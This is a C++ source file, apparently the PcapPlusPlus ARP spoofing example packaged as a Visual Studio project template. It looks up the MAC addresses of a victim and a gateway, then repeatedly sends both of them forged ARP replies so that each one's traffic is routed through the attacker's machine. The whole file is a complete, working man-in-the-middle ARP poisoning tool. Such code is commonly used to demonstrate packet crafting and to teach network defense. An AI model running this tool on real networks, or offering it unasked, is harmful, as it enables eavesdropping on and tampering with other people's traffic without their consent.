// Visual Studio 2015 Example Project
// ==================================
// This is a solution and project already configured for working with PcapPlusPlus
// All you need is to start writing your code. All include paths, lib paths and linked libs are already set
// This solution and project are also locatable. You can copy/move them to wherever you want
// Before opening this solution, please make sure you run configure-windows-visual-studio.bat. It prepares PcapPlusPlusPropertySheet.props
// which contains paths to PcapPlusPlus location and other 3rd party components (such as WinPcap and pthreads-win32)

#include <winsock2.h>
#include <MacAddress.h>
#include <IpAddress.h>
#include <PlatformSpecificUtils.h>
#include <PcapLiveDeviceList.h>
#include <PcapLiveDevice.h>
#include <EthLayer.h>
#include <ArpLayer.h>

using namespace std;

using namespace pcpp;

void print_usage() {
	printf("Usage: Pcap++Examples.ArpSpoofing <INTERFACE_IP> <VICTIM_IP> <GATEWAY_IP> \n\n");
}

MacAddress getMacAddress(const IPv4Address& ipAddr, PcapLiveDevice* pDevice)
{
	// Create an ARP packet and change its fields
	Packet arpRequest(500);

	MacAddress macSrc = pDevice->getMacAddress();
	MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
	EthLayer ethLayer(macSrc, macDst, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer arpLayer(ARP_REQUEST,
		pDevice->getMacAddress(),
		pDevice->getMacAddress(),
		pDevice->getIPv4Address(),
		ipAddr);


	arpRequest.addLayer(&ethLayer);
	arpRequest.addLayer(&arpLayer);
	arpRequest.computeCalculateFields();

	//setup arp reply filter
	ArpFilter arpFilter(ARP_REPLY);
	pDevice->setFilter(arpFilter);

	//send the arp request and wait for arp reply
	pDevice->sendPacket(&arpRequest);
	RawPacketVector capturedPackets;
	pDevice->startCapture(capturedPackets);
	PCAP_SLEEP(2);
	pDevice->stopCapture();

	if (capturedPackets.size() < 1)
	{
		printf("No arp reply was captured. Couldn't retrieve MAC address for IP %s\n", ipAddr.toString().c_str());
		return MacAddress("");
	}

	//parse arp reply and extract the MAC address
	Packet arpReply(capturedPackets.front());
	if (arpReply.isPacketOfType(ARP))
	{
		return arpReply.getLayerOfType<ArpLayer>()->getSenderMacAddress();
	}
	printf("No arp reply was captured. Couldn't retrieve MAC address for IP %s\n", ipAddr.toString().c_str());
	return MacAddress("");
}

bool doArpSpoofing(PcapLiveDevice* pDevice, const IPv4Address& gatewayAddr, const IPv4Address& victimAddr)
{
	// Get the gateway MAC address
	MacAddress gatewayMacAddr = getMacAddress(gatewayAddr, pDevice);
	if (!gatewayMacAddr.isValid())
	{
		printf("Failed to find gateway MAC address. Exiting...\n");
		return false;
	}
	printf("Got gateway MAC address: %s\n", gatewayMacAddr.toString().c_str());

	// Get the victim MAC address
	MacAddress victimMacAddr = getMacAddress(victimAddr, pDevice);
	if (!victimMacAddr.isValid())
	{
		printf("Failed to find victim MAC address. Exiting...\n");
		return false;
	}
	printf("Got victim MAC address: %s\n", victimMacAddr.toString().c_str());

	MacAddress deviceMacAddress = pDevice->getMacAddress();

	// Create ARP reply for the gateway
	Packet gwArpReply(500);
	EthLayer gwEthLayer(deviceMacAddress, gatewayMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer gwArpLayer(ARP_REPLY,
		pDevice->getMacAddress(),
		gatewayMacAddr,
		victimAddr,
		gatewayAddr);
	gwArpReply.addLayer(&gwEthLayer);
	gwArpReply.addLayer(&gwArpLayer);
	gwArpReply.computeCalculateFields();

	// Create ARP reply for the victim
	Packet victimArpReply(500);
	EthLayer victimEthLayer(deviceMacAddress, victimMacAddr, (uint16_t)PCPP_ETHERTYPE_ARP);
	ArpLayer victimArpLayer(ARP_REPLY,
		pDevice->getMacAddress(),
		victimMacAddr,
		gatewayAddr,
		victimAddr);
	victimArpReply.addLayer(&victimEthLayer);
	victimArpReply.addLayer(&victimArpLayer);
	victimArpReply.computeCalculateFields();

	// Send ARP replies to gateway and to victim every 5 seconds
	printf("Sending ARP replies to victim and to gateway every 5 seconds...\n\n");
	while (true)
	{
		pDevice->sendPacket(&gwArpReply);
		printf("Sent ARP reply: %s [gateway] is at MAC address %s [me]\n", gatewayAddr.toString().c_str(), deviceMacAddress.toString().c_str());
		pDevice->sendPacket(&victimArpReply);
		printf("Sent ARP reply: %s [victim] is at MAC address %s [me]\n\n", victimAddr.toString().c_str(), deviceMacAddress.toString().c_str());
		PCAP_SLEEP(5);
	}

	return true;
}

int main(int argc, char* argv[])
{
	//Get arguments from user for incoming interface and outgoing interface

	string iface = "", victim = "", gateway = "";

	if (argc < 4)
	{
		print_usage();
		exit(-1);
	}

	iface = string(argv[1]);
	victim = string(argv[2]);
	gateway = string(argv[3]);

	//Both incoming and outgoing interfaces must be provided by user
	if (iface == "" || victim == "" || gateway == "")
	{
		print_usage();
		exit(-1);
	}

	//Currently supports only IPv4 addresses
	IPv4Address ifaceAddr(iface);
	IPv4Address victimAddr(victim);
	IPv4Address gatewayAddr(gateway);

	PcapLiveDevice* pIfaceDevice = PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIp(ifaceAddr);

	//Verifying interface is valid
	if (pIfaceDevice == NULL)
	{
		printf("Cannot find interface. Exiting...\n");
		exit(-1);
	}

	if (!victimAddr.isValid())
	{
		printf("Victim address not valid. Exiting...\n");
		exit(-1);
	}

	if (!gatewayAddr.isValid())
	{
		printf("Gateway address not valid. Exiting...\n");
		exit(-1);
	}

	//Opening interface device
	if (!pIfaceDevice->open())
	{
		printf("Cannot open interface. Exiting...\n");
		exit(-1);
	}

	return (!doArpSpoofing(pIfaceDevice, gatewayAddr, victimAddr));
}
